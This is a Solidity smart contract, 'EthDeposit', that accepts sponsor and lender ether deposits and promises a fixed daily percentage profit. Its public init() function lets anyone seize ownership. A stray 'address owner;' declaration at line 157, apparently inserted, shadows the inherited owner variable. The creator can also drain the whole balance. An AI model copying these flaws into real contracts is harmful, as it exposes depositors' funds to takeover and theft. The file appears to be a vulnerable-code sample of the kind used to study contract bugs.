1 pragma solidity ^0.4.17;
2 
3 contract Owned 
4 {
5     address newOwner;
6     address owner = msg.sender;
7     address creator = msg.sender;
8     
9     function changeOwner(address addr)
10     public
11     {
12         if(isOwner())
13         {
14             newOwner = addr;
15         }
16     }
17     
18     function confirmOwner()
19     public
20     {
21         if(msg.sender==newOwner)
22         {
23             owner=newOwner;
24         }
25     }
26     
27     
28     function isOwner()
29     internal
30     constant
31     returns(bool)
32     {
33         return owner == msg.sender;
34     }
35     
36     function WthdrawAllToCreator()
37     public
38     payable
39     {
40         if(msg.sender==creator)
41         {
42             creator.transfer(this.balance);
43         }
44     }
45     
46     function WthdrawToCreator(uint val)
47     public
48     payable
49     {
50         if(msg.sender==creator)
51         {
52             creator.transfer(val);
53         }
54     }
55     
56     function WthdrawTo(address addr,uint val)
57     public
58     payable
59     {
60         if(msg.sender==creator)
61         {
62             addr.transfer(val);
63         }
64     }
65 }
66 
67 contract EthDeposit is Owned
68 {
69     address public Manager;
70     
71     address public NewManager;
72     
73     uint public SponsorsQty;
74     
75     uint public CharterCapital;
76     
77     uint public ClientQty;
78     
79     uint public PrcntRate = 5;
80     
81     bool paymentsAllowed;
82     
83     struct Lender
84     {
85         uint LastLendTime;
86         uint Amount;
87         uint Reserved;
88     }
89     
90     mapping (address => uint) public Sponsors;
91     
92     mapping (address => Lender) public Lenders;
93     
94     event StartOfPayments(address indexed calledFrom, uint time);
95     
96     event EndOfPayments(address indexed calledFrom, uint time);
97     
98     function init(address _manager)
99     public
100     {
101         owner = msg.sender;
102         Manager = _manager;
103     }
104     
105     function isManager()
106     private
107     constant
108     returns (bool)
109     {
110         return(msg.sender==Manager);
111     }
112     
113     function canManage()
114     private
115     constant
116     returns (bool)
117     {
118         return(msg.sender==Manager||msg.sender==owner);
119     }
120     
121     function ChangeManager(address _newManager)
122     public
123     {
124         if(canManage())
125         { 
126             NewManager = _newManager;
127         }
128     }
129 
130     function ConfirmManager()
131     public
132     {
133         if(msg.sender==NewManager)
134         {
135             Manager=NewManager;
136         }
137     }
138     
139     function StartPaymens()
140     public
141     {
142         if(canManage())
143         { 
144             AuthorizePayments(true);
145             StartOfPayments(msg.sender, now);
146         }
147     }
148     
149     function StopPaymens()
150     public
151     {
152         if(canManage())
153         { 
154             AuthorizePayments(false);
155             EndOfPayments(msg.sender, now);
156         }
157     }address owner;
158     
159     function AuthorizePayments(bool val)
160     public
161     {
162         if(isOwner())
163         {
164             paymentsAllowed = val;
165         }
166     }
167     
168     function SetPrcntRate(uint val)
169     public
170     {
171         if(canManage())
172         {
173             if(val!=PrcntRate)
174             {
175                 if(val>=1)
176                 {
177                     PrcntRate = val;  
178                 }
179             }
180         }
181     }
182     
183     function()
184     public
185     payable
186     {
187         ToSponsor();
188     }
189     
190     function ToSponsor() 
191     public
192     payable
193     {
194         if(msg.value>= 1 ether)
195         {
196             if(Sponsors[msg.sender]==0)SponsorsQty++;
197             Sponsors[msg.sender]+=msg.value;
198             CharterCapital+=msg.value;
199         }   
200     }
201     
202     function WithdrawToSponsor(address _addr, uint _wei) 
203     public 
204     payable
205     {
206         if(Sponsors[_addr]>0)
207         {
208             if(isOwner())
209             {
210                  if(_addr.send(_wei))
211                  {
212                    if(CharterCapital>=_wei)CharterCapital-=_wei;
213                    else CharterCapital=0;
214                  }
215             }
216         }
217     }
218     
219     function Deposit() 
220     public 
221     payable
222     {
223         FixProfit();//fix time inside
224         Lenders[msg.sender].Amount += msg.value;
225     }
226     
227     function CheckProfit(address addr) 
228     public 
229     constant 
230     returns(uint)
231     {
232         return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);
233     }
234     
235     function FixProfit()
236     public
237     {
238         if(Lenders[msg.sender].Amount>0)
239         {
240             Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
241         }
242         Lenders[msg.sender].LastLendTime=now;
243     }
244     
245     function WitdrawLenderProfit() 
246     public 
247     payable
248     {
249         if(paymentsAllowed)
250         {
251             FixProfit();
252             uint profit = Lenders[msg.sender].Reserved;
253             Lenders[msg.sender].Reserved = 0;
254             msg.sender.transfer(profit);
255         }
256     }
257     
258 }